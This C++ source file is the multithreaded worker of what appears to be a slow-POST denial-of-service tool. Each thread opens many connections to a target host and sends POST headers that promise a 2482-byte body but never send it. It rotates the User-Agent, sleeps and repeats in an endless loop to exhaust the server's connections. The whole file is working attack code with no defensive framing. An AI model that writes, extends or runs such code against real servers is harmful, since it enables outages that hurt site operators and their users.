/*
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
| I know class isn't clean. But it works :D											|
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
*/

#include "main.h"
#include "io_service.h"
#include "Socket.h"
#include "misc.h"
#include "Exception.h"
#include "worker.h"
#ifdef _WIN32
DWORD WINAPI work(LPVOID _para)
#else
void* work(void* _para)
#endif
{
	int number=0;
	try {

		params para=*((params*) _para);
		io_service service=*para._service;
		argstruct args=*para._args;
		number = para.number;
		unsigned int count=0;
		for(;;) {
			count++;
			std::vector<Socket> sockets;
			for(int i=0; i<(args.connections/args.threads); i++) sockets.push_back(Socket(&service));
			for(unsigned int i=0; i<sockets.size(); i++) if(sockets[i].Connect()<0) throw Exception("Can't connect");
			std::string request = "POST / HTTP/1.1\r\n";
			if(args.userAgent.empty()) request += "User-Agent: "+misc::randBrowser()+"\r\n";
			else request += "User-Agent: "+args.userAgent+"\r\n";
			request += "Connection: Keep-Alive\r\n";
			request += "Host: "+args.address+"\r\n";
			request += "Content-Length: 2482\r\n";
			for(unsigned int i=0; i<sockets.size(); i++) if(sockets[i].Send(request, 0)<0) throw Exception("send() failed!");;
			std::cout << "[Thread " << number << "] Stage " << count << " sent! Sleeping for " << args.seconds << " seconds..." << std::endl;	
			wait(args.seconds);
			for(unsigned int i=0; i<sockets.size(); i++) sockets[i].Close();
		}
	} catch(Exception& e) {
	}
}

void worker::start() {
#ifdef _WIN32
	this->thread=CreateThread(NULL, 0, work, &this->para, 0, 0);
#else
	pthread_create(&this->thread, NULL, &work, &para);
#endif
}

worker::worker(io_service* _service, argstruct* _args, int number) {
	this->para._args=_args;
	this->para._service=_service;
	this->para.number=number;
}

void worker::join() {
#ifdef _WIN32
	WaitForSingleObject(this->thread, INFINITE);
#else
	pthread_join(this->thread, NULL);
#endif
}
